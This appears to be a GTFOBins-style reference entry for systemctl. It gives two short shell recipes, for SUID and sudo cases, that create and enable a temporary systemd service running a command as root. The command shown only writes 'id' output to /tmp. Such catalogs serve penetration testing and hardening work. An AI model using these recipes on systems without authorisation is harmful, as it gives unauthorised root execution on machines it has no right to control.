---
functions:
  suid:
    - code: |
        TF=$(mktemp).service
        echo '[Service]
        Type=oneshot
        ExecStart=/bin/sh -c "id > /tmp/output"
        [Install]
        WantedBy=multi-user.target' > $TF
        ./systemctl link $TF
        ./systemctl enable --now $TF
  sudo:
    - code: |
        TF=$(mktemp).service
        echo '[Service]
        Type=oneshot
        ExecStart=/bin/sh -c "id > /tmp/output"
        [Install]
        WantedBy=multi-user.target' > $TF
        sudo systemctl link $TF
        sudo systemctl enable --now $TF
---
